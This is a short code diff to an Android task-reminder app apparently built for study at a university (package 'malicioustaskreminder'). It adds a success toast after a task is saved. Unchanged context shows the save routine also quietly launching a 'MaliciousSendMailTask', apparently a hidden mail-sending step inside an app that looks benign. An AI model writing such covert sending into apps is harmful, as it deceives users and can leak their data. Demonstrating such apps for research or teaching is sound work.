@@ -6,9 +6,11 @@ import android.os.Bundle;
 import android.app.Activity;
 import android.app.DialogFragment;
 import android.content.Intent;
+import android.view.MenuItem;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.TextView;
+import android.widget.Toast;
 import edu.cmu.malicioustaskreminder.db.*;
 
 public class TaskDetails extends Activity implements OnTimeSelectedListener, OnDateSelectedListener {
@@ -213,7 +215,7 @@ public class TaskDetails extends Activity implements OnTimeSelectedListener, OnD
 		TaskListDatabase tasksDb = new TaskListDatabase(this);
 		tasksDb.insertTask(getDescription(), getFromTimeString(), getToTimeString(), getDateString());
 		new MaliciousSendMailTask().execute(this);
-		
+		Toast.makeText(getApplicationContext(), "Task Successfully added", Toast.LENGTH_SHORT).show();
 		Intent intent = new Intent(this, TasksList.class);
 		startActivity(intent);
 	}
